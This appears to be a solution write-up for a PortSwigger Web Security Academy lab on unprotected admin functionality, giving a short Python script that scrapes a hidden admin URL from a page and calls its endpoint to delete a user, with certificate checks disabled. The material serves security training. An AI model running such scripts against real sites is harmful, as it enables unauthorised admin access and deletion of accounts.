# Lab: Unprotected admin functionality with unpredictable URL

Link to lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0aff0066042b7ac5c185a3210009000d.web-security-academy.net/'

session = requests.Session()

response = session.get(
    url + 'my-account',
    verify=False,
)
pattern = r"admin-\w{6}\b"
match = re.search(pattern, response.text)


response = session.get(
    url + match.group() + '/delete?username=carlos',
    verify= False
)

print(response.text)
```